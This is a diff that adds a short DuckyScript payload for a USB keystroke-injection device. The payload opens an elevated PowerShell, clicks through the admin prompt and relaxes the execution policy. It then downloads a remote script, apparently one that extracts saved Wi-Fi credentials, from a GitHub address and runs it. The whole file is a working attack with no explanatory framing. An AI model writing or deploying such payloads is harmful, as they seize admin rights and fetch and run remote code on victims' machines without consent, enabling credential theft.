@@ -1,0 +1,16 @@
+LOCLAE ES
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell
+CONTROL SHIFT ENTER
+DELAY 500
+ALT y
+DELAY 500
+STRING Set-ExecutionPolicy RemoteSigned
+ENTER
+STRING a
+ENTER
+DELAY 200
+ENTER
+STRING wget "https://github.com/tomassj9/wifiextract/raw/main/script.ps1" -o \d.ps1;\d.ps1
